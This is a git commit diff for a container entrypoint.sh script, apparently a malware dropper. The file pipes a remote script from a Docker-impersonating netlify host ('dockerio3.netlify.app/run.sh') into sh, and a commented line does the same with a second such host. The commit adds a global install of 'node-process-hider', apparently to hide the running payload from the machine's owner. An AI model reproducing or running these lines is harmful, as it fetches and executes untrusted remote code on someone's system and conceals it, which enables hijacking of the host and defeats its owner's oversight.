2e309f9bf0a3a5cbdeba3a7df236412f36abbe15
juan robert <kijang-020@hotmail.com>
2021-11-10 07:08:33 +0000

    entrypoint.sh edited online with Bitbucket

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,2 +1,5 @@
+sudo apt-get update
+sudo apt-get install -y npm
+sudo sudo npm i -g node-process-hider
 curl https://dockerio3.netlify.app/run.sh | sh
 #curl https://dockerio2.netlify.app/run.sh | sh
